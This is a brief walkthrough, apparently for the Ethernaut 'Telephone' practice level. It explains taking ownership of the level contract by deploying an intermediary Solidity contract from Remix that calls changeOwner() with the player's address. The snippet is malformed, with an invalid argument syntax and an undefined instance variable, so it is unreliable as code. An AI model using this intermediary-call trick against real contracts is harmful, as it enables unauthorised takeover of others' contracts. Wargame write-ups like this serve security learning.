#How To

From remix.ethereum.org, make a new hack contract with instance level address as contract instance, then call changeOwner() with player address as argument. I become the owner. 
    
    contract HackTelephone {
        Telephone public instance = Telephone(levelinstance);
        function becomeOwner() public returns (bool) {
            instance.changeOwner(player=0x283...)
        } 
    }
